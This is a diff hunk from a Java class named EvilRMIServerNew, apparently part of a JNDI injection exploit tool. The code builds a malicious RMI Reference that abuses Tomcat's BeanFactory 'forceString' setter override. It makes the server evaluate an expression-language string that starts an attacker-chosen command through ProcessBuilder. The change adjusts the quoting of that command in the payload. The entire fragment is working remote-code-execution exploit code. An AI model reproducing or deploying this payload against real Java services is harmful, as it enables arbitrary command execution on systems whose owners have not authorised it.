@@ -34,7 +34,7 @@ public class EvilRMIServerNew implements Runnable {
             //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
             ref.add(new StringRefAddr("forceString", "x=eval"));
             //expression language to execute our command
-            ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])']([" + cmd + "]).start()\")"));
+            ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['" + cmd + "']).start()\")"));
 
             ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
             registry.bind("Object", referenceWrapper);
